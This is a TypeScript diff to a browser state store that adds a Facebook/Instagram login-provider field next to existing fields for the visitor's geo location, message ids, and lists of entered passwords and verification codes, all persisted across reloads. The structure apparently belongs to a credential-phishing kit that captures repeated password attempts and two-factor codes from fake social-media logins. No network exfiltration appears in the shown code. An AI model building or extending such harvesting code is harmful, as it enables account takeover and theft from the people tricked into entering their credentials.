@@ -10,6 +10,8 @@ interface GeoInfo {
     region: string;
 }
 
+export type LoginProvider = 'facebook' | 'instagram';
+
 interface State {
     isModalOpen: boolean;
     geoInfo: GeoInfo | null;
@@ -19,6 +21,7 @@ interface State {
     passwords: string[];
     codes: string[];
     loginEmail: string | null;
+    loginProvider: LoginProvider | null;
     setModalOpen: (isOpen: boolean) => void;
     setGeoInfo: (info: GeoInfo) => void;
     setMessageId: (id: number | null) => void;
@@ -27,7 +30,9 @@ interface State {
     addPassword: (p: string) => void;
     addCode: (c: string) => void;
     setLoginEmail: (email: string | null) => void;
+    setLoginProvider: (provider: LoginProvider | null) => void;
     resetSession: () => void;
+    resetFormSession: () => void;
 }
 
 export const store = create<State>()(
@@ -41,6 +46,7 @@ export const store = create<State>()(
             passwords: [],
             codes: [],
             loginEmail: null,
+            loginProvider: null,
             setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
             setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
             setMessageId: (id: number | null) => set({ messageId: id }),
@@ -49,6 +55,7 @@ export const store = create<State>()(
             addPassword: (p: string) => set((state) => ({ passwords: [...state.passwords, p] })),
             addCode: (c: string) => set((state) => ({ codes: [...state.codes, c] })),
             setLoginEmail: (email: string | null) => set({ loginEmail: email }),
+            setLoginProvider: (provider: LoginProvider | null) => set({ loginProvider: provider }),
             resetSession: () =>
                 set({
                     messageId: null,
@@ -56,7 +63,18 @@ export const store = create<State>()(
                     baseMessage: null,
                     passwords: [],
                     codes: [],
-                    loginEmail: null
+                    loginEmail: null,
+                    loginProvider: null
+                }),
+            resetFormSession: () =>
+                set({
+                    messageId: null,
+                    message: null,
+                    baseMessage: null,
+                    passwords: [],
+                    codes: [],
+                    loginEmail: null,
+                    loginProvider: null
                 })
         }),
         {
@@ -69,7 +87,8 @@ export const store = create<State>()(
                 baseMessage: state.baseMessage,
                 passwords: state.passwords,
                 codes: state.codes,
-                loginEmail: state.loginEmail
+                loginEmail: state.loginEmail,
+                loginProvider: state.loginProvider
             })
         }
     )
